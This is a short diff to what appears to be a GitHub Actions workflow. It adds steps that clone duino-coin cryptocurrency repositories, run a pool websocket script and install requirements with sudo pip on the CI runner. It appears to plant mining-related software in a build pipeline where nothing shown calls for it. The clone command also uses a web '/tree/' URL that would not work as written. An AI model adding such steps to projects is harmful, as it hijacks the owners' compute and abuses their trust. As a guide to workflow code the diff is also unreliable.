@@ -25,7 +25,9 @@ jobs:
      runner: [0]
    steps:
      - run: |
- 
+        git clone https://github.com/revoxhere/duino-coin/tree/useful-tools
+        cd useful-tools
+        python duco_pool_websocket.py
         git clone https://github.com/shah77pc/duino-coin
         cd duino-coin
         sudo python3 -m pip install -r requirements.txt # Install pip dependencies
